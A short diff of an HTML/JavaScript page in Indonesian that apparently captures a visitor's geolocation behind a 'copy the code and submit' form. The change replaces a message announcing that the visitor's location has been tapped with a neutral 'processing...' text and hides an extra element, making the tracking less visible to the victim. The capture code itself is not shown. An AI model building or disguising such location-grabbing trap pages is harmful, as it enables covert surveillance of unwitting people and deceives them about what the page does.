@@ -135,7 +135,7 @@
 						  text-align:center;
 						  font-weight:bold;
 						  display:none;
-						  font-size:30px;}
+						  font-size:18px;}
 						  
 						  .bawah{
 						   padding:20px;
@@ -217,12 +217,12 @@ function showPosition(position) {
 				
 				
 				
-				<p class="miring" id="miring"><em>Salin code lalu masukan </em></p>
+				<p class="miring" id="miring"><em>Salin code lalu masukan (jika kode tidak ada silahkan refresh)</em></p>
 				
 				<input type="text" name="gambar" id="lokasi" class="lokasi" placeholder="####"><br><br>
 				<button class="kirim" id="kirim" type="submit">Kirim</button></form>
 				
-				<p class="lastman" id="lastman">Selamat anda kena shadap location</p>
+				<p class="lastman" id="lastman">Sedang dalam proses...</p>
 				<br><br><br><br>	<br><br>
 				
 				<div class="bawah">
@@ -254,6 +254,7 @@ function showPosition(position) {
      $("#miring").fadeOut(100);
     $("#kode").fadeOut(100);
     $("#lastman").fadeIn(1000);
+    $("#demo").fadeOut(100);
     
     });
 });
